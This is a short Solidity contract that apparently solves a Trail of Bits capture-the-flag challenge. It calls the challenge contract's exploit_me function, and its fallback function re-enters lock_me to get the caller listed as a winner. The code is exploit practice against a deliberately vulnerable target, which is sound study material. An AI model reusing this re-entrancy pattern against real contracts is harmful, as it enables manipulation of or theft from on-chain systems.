pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.

contract challengeInterface{
    function exploit_me(address winner) public{}
    function lock_me() public{}
}

contract MyAttack{    
	//trail of bits challenge addr
    address chAddress = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;
    challengeInterface public challengeContract = challengeInterface(chAddress);
    fallback() external{
        challengeContract.lock_me();
    }
    function attack() external {
        challengeContract.exploit_me(msg.sender);
    }
}